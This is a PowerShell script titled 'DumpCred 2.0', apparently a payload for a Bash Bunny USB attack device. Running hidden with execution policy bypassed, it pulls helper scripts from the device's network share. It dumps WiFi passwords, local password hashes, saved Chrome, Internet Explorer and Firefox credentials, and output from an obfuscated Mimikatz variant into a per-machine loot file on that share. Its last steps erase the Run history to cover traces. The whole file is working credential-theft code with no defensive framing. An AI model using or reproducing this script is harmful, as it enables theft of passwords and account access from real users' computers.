<#
.SYNOPSIS
   DumpCred 2.0
.DESCRIPTION
   Dumps all Creds from a PC 
.PARAMETER <paramName>
   none
.EXAMPLE
   DumpCred
#>

# Share on bashbunny
$SHARE="\\172.16.64.1\e"
$LOOT="$SHARE\loot"
$FILE="$LOOT\$env:COMPUTERNAME.txt"

# Handshake - create CON_REQ on Share. Bunny creates CON_OK if all is OK --- Check Share is writable
while (!(Test-Path "$SHARE\CON_OK")) { 
    echo "" > "$SHARE\CON_REQ"
    Start-Sleep 1 
}

# Go on......

# Dumps WiFi Passwords
$WiFiCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1
$OUT = $WifiCreds

# Dumps all the local Hashes
$PowerDump = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-PowerDump.ps1
$OUT = $OUT + "`n`n`n"+ $Powerdump

# Dumps Chrome Credentials
$ChromeCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-ChromeCreds.ps1
$OUT = $OUT + "`n`n`n"+ $ChromeCreds

# Dumps IE Credentials
$IECreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-IECreds.ps1
$OUT = $OUT + "`n`n`n"+ $IECreds

# Dumps FireFox Credentials
$powershellx86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
$FoxCreds = & $powershellx86 -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-FoxDump.ps1
$OUT = $OUT + "`n`n`n"+ $FoxCreds

# M1m1kat3 Output
$M1m1d0gz = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Invoke-M1m1d0gz.ps1
$OUT = $OUT + "`n`n`n"+ $M1m1d0gz

# Write File
Write-Output $OUT  | Out-File $FILE


# Cleanup
# Remove Run History
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

# Rename CON_OK to CON_EOF so bunny knows that all the stuff has finished
Rename-Item -Path "$SHARE\CON_OK" -NewName "$SHARE\CON_EOF"